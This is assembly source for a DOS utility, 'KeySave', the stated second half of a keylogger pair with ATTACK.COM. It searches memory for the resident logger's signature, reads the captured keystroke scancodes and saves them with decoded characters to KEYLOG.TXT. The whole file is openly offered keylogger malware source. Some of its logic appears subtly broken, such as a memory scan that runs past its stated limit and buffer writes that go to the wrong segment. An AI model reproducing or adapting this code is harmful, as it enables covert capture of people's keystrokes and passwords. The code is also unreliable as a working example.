; KeySave - Companion utility for attack.com
; Reads keyboard data from memory and saves to file
; Part 2 of dual-program design for reliable keyboard logging

ORG 100h

start:
    ; Check if keyboard monitor is installed
    call find_keylogger
    jc not_found
    
    ; Found it - display information
    call display_info
    
    ; Ask user if they want to save
    mov dx, prompt_msg
    mov ah, 09h
    int 21h
    
    ; Get user response
    mov ah, 01h
    int 21h
    
    ; Check if user pressed Y or y
    cmp al, 'Y'
    je save_data
    cmp al, 'y'
    je save_data
    
    ; User declined, exit
    mov dx, cancel_msg
    mov ah, 09h
    int 21h
    ret
    
save_data:
    ; Create file
    mov ah, 0x3C
    xor cx, cx
    mov dx, log_file
    int 21h
    jc file_error
    
    mov [file_handle], ax
    mov bx, ax
    
    ; Write header
    mov ah, 0x40
    mov cx, header_len
    mov dx, log_header
    int 21h
    jc write_error
    
    ; Write keystroke data
    call write_keystrokes
    
    ; Close file
    mov ah, 0x3E
    mov bx, [file_handle]
    int 21h
    
    ; Show success message
    mov dx, success_msg
    mov ah, 09h
    int 21h
    ret
    
file_error:
    ; Show file error message
    mov dx, file_error_msg
    mov ah, 09h
    int 21h
    ret
    
write_error:
    ; Close file
    mov ah, 0x3E
    mov bx, [file_handle]
    int 21h
    
    ; Show write error message
    mov dx, write_error_msg
    mov ah, 09h
    int 21h
    ret
    
not_found:
    ; Show not found message
    mov dx, not_found_msg
    mov ah, 09h
    int 21h
    ret

; Find keyboard monitor in memory
; Output: ES:BX points to shared data area, carry flag clear if found
find_keylogger:
    push ax
    push cx
    push dx
    push di
    
    ; Start search at PSP segment (0x0000)
    xor ax, ax
    mov es, ax
    
    ; Search through memory for our signature
    mov cx, 0xA000   ; Search up to this segment (640K)
    
search_loop:
    mov di, 0        ; Start of segment
    mov dx, 0x1000   ; Search 64K (4096 * 16 bytes)
    
scan_segment:
    mov ax, [es:di]
    cmp ax, 'KL'     ; Look for signature
    je check_rest
    add di, 2
    dec dx
    jnz scan_segment
    
    ; Move to next segment
    mov ax, es
    add ax, 0x1000   ; 64K segments
    mov es, ax
    loop search_loop
    
    ; Not found
    stc
    jmp search_done
    
check_rest:
    ; Found a potential match, verify it's our data
    ; At this point ES:DI points to the signature
    ; Make sure there are counters after it
    
    ; Store ES:DI as our found location
    mov bx, di
    clc
    
search_done:
    pop di
    pop dx
    pop cx
    pop ax
    ret

; Display information about found keyboard monitor
display_info:
    push ax
    push bx
    push cx
    push dx
    
    ; ES:BX points to the shared data area
    
    ; Display banner
    mov dx, info_banner
    mov ah, 09h
    int 21h
    
    ; Display total keys
    mov dx, total_keys_msg
    mov ah, 09h
    int 21h
    
    ; Get total keys from shared area
    mov ax, [es:bx+2]  ; shared_total_keys is at offset 2
    
    ; Convert to decimal string
    call convert_decimal
    
    ; Display the decimal string
    mov dx, number_buffer
    mov ah, 09h
    int 21h
    
    ; Display newline
    mov dx, newline
    mov ah, 09h
    int 21h
    
    ; Display buffer size
    mov dx, buffer_size_msg
    mov ah, 09h
    int 21h
    
    ; Get buffer size from shared area
    mov ax, [es:bx+4]  ; shared_buffer_size is at offset 4
    
    ; Convert to decimal string
    call convert_decimal
    
    ; Display the decimal string
    mov dx, number_buffer
    mov ah, 09h
    int 21h
    
    ; Display newline
    mov dx, newline
    mov ah, 09h
    int 21h
    
    pop dx
    pop cx
    pop bx
    pop ax
    ret

; Write keystroke data to file
write_keystrokes:
    push ax
    push bx
    push cx
    push dx
    push si
    push di
    
    ; ES:BX points to the shared data area
    
    ; Display writing message
    mov dx, writing_msg
    mov ah, 09h
    int 21h
    
    ; Get buffer size and calculate bytes to write
    mov cx, [es:bx+4]  ; shared_buffer_size
    test cx, cx
    jz no_keys
    
    ; Calculate buffer starting position
    mov ax, [es:bx+6]  ; shared_buffer_end
    sub ax, cx         ; End - Size = Start
    jnc no_wrap
    add ax, 2048       ; Handle wraparound (buffer size)
    
no_wrap:
    mov [buffer_start], ax
    
    ; Prepare write buffer
    mov di, write_buffer
    
    ; Add total keys line
    mov dx, total_keys_msg
    call copy_string_to_buffer
    
    ; Get total keys
    mov ax, [es:bx+2]  ; shared_total_keys
    
    ; Convert to decimal
    push di
    call convert_decimal
    pop di
    
    ; Copy number to buffer
    mov si, number_buffer
    call copy_asciiz_to_buffer
    
    ; Add newline
    mov al, 13
    stosb
    mov al, 10
    stosb
    
    ; Add keystroke data header
    mov dx, keystroke_header
    call copy_string_to_buffer
    
    ; Add newline
    mov al, 13
    stosb
    mov al, 10
    stosb
    
    ; Now add the keystroke data
    mov cx, [es:bx+4]  ; shared_buffer_size
    test cx, cx
    jz skip_keys
    
    ; Get start position
    mov si, [buffer_start]
    add si, 8          ; Offset to shared_buffer
    add si, bx         ; Add base address
    
    ; Initialize line counter
    mov dx, 0
    
process_keys:
    ; Get key scancode
    mov al, [es:si]
    
    ; Convert to hex
    call byte_to_hex_string
    
    ; Try to convert to character
    call scancode_to_char
    
    ; Add space between entries
    mov al, ' '
    stosb
    
    ; Increment line counter and check if we need a newline
    inc dx
    cmp dx, 16
    jne no_newline
    
    ; Add newline every 16 keys
    mov al, 13
    stosb
    mov al, 10
    stosb
    xor dx, dx
    
no_newline:
    ; Move to next key (with wraparound)
    inc si
    
    ; Check if we've reached the end of the shared buffer area
    mov ax, si
    sub ax, bx         ; Calculate offset from base
    sub ax, 8          ; Adjust for header
    cmp ax, 2048       ; Compare with buffer size
    jb no_buffer_wrap
    
    ; Wrap around to start of buffer
    mov si, bx
    add si, 8          ; Offset to shared_buffer
    
no_buffer_wrap:
    ; Decrement counter
    dec cx
    jnz process_keys
    
skip_keys:
    ; Add final newline
    mov al, 13
    stosb
    mov al, 10
    stosb
    
    ; Calculate total bytes to write
    mov cx, di
    sub cx, write_buffer
    
    ; Write the data
    mov ah, 0x40
    mov bx, [file_handle]
    mov dx, write_buffer
    int 21h
    
no_keys:
    pop di
    pop si
    pop dx
    pop cx
    pop bx
    pop ax
    ret

; Copy string to buffer
; Input: DX = string address, DI = destination buffer
copy_string_to_buffer:
    push ax
    push si
    
    mov si, dx
    
.copy_loop:
    lodsb
    test al, al
    jz .done
    stosb
    jmp .copy_loop
    
.done:
    pop si
    pop ax
    ret

; Copy ASCIIZ string to buffer
; Input: SI = string address, DI = destination buffer
copy_asciiz_to_buffer:
    push ax
    
.copy_loop:
    lodsb
    test al, al
    jz .done
    stosb
    jmp .copy_loop
    
.done:
    pop ax
    ret

; Convert scancode to character representation
; Input: AL = scancode, DI = destination buffer
; Output: DI = updated buffer position
scancode_to_char:
    push ax
    push bx
    
    ; Add opening bracket
    mov al, '['
    stosb
    
    ; Check if scancode is in valid range
    cmp byte [es:si], 0x58
    ja .unknown_char
    cmp byte [es:si], 0x02
    jb .unknown_char
    
    ; Check common special cases
    cmp byte [es:si], 0x39
    je .space_key
    cmp byte [es:si], 0x1C
    je .enter_key
    cmp byte [es:si], 0x0E
    je .backspace_key
    
    ; Use conversion table
    mov bl, [es:si]
    sub bl, 0x02
    xor bh, bh
    
    ; Get character from table (simplified for this utility)
    ; We'll use a simple approximation since we don't know shift state
    push si
    mov si, scancode_to_char_table
    add si, bx
    mov al, [si]
    pop si
    
    ; Check if it's a printable character
    cmp al, ' '
    jb .unknown_char
    cmp al, '~'
    ja .unknown_char
    
    stosb
    jmp .finalize
    
.space_key:
    mov al, ' '
    stosb
    jmp .finalize
    
.enter_key:
    mov al, 'E'
    stosb
    mov al, 'N'
    stosb
    mov al, 'T'
    stosb
    mov al, 'R'
    stosb
    jmp .finalize
    
.backspace_key:
    mov al, 'B'
    stosb
    mov al, 'S'
    stosb
    jmp .finalize
    
.unknown_char:
    mov al, '?'
    stosb
    
.finalize:
    ; Add closing bracket
    mov al, ']'
    stosb
    
    pop bx
    pop ax
    ret

; Convert byte to hex string
; Input: AL = byte, DI = destination buffer
; Output: DI = updated buffer position
byte_to_hex_string:
    push ax
    
    ; Store original byte
    mov ah, al
    
    ; Process high nibble
    shr al, 4
    call .nibble_to_hex
    stosb
    
    ; Process low nibble
    mov al, ah
    and al, 0Fh
    call .nibble_to_hex
    stosb
    
    pop ax
    ret
    
.nibble_to_hex:
    add al, '0'
    cmp al, '9'
    jbe .done
    add al, 7  ; 'A' - '0' - 10
.done:
    ret

; Convert number to decimal string
; Input: AX = number
; Output: number_buffer contains the string
convert_decimal:
    push ax
    push bx
    push cx
    push dx
    push di
    
    mov di, number_buffer
    mov bx, 10
    mov cx, 0
    
    ; Handle 0 specially
    test ax, ax
    jnz .convert_loop
    mov byte [di], '0'
    inc di
    jmp .finish
    
.convert_loop:
    xor dx, dx
    div bx          ; DX:AX / 10 -> AX=quotient, DX=remainder
    push dx         ; Save remainder
    inc cx          ; Count digits
    test ax, ax     ; Check if quotient is zero
    jnz .convert_loop
    
.output_loop:
    pop dx
    add dl, '0'     ; Convert to ASCII
    mov [di], dl
    inc di
    loop .output_loop
    
.finish:
    mov byte [di], '$' ; Add terminator for DOS print
    
    pop di
    pop dx
    pop cx
    pop bx
    pop ax
    ret

; Data section
file_handle     dw 0
buffer_start    dw 0
number_buffer   db 16 dup(0)
write_buffer    db 8192 dup(0)

; Messages
info_banner     db 'KeySave - Keyboard Log File Utility', 0Dh, 0Ah
                db '===================================', 0Dh, 0Ah, '$'
                
total_keys_msg  db 'Total keys pressed: $'
buffer_size_msg db 'Keys in buffer: $'
newline         db 0Dh, 0Ah, '$'

prompt_msg      db 0Dh, 0Ah, 'Save keyboard data to file? (Y/N) $'
writing_msg     db 0Dh, 0Ah, 'Writing keyboard data... $'
success_msg     db 0Dh, 0Ah, 'Keyboard data saved successfully to KEYLOG.TXT', 0Dh, 0Ah, '$'
cancel_msg      db 0Dh, 0Ah, 'Operation cancelled.', 0Dh, 0Ah, '$'
not_found_msg   db 'ERROR: Keyboard monitor not found in memory.', 0Dh, 0Ah
                db 'Run ATTACK.COM first.', 0Dh, 0Ah, '$'
file_error_msg  db 0Dh, 0Ah, 'ERROR: Could not create log file.', 0Dh, 0Ah, '$'
write_error_msg db 0Dh, 0Ah, 'ERROR: Could not write to log file.', 0Dh, 0Ah, '$'

; File content
log_file        db 'KEYLOG.TXT', 0
log_header      db '===== KEYBOARD LOG =====', 0Dh, 0Ah
                db 'Format: Scancode [character]', 0Dh, 0Ah
                db '-----------------------------------', 0Dh, 0Ah, 0Dh, 0Ah
header_len      equ $ - log_header

keystroke_header db 'Recorded keystrokes (Hex [Char]):', 0

; Simplified scancode to character table (for display purposes only)
scancode_to_char_table:
                db '1234567890-=', 8      ; 0x02-0x0E
                db 9, 'qwertyuiop[]', 13  ; 0x0F-0x1C
                db 0, 'asdfghjkl;', 39, '`' ; 0x1D-0x29
                db 0, '\zxcvbnm,./', 0    ; 0x2A-0x36
                db 20 dup('?')            ; Other keys 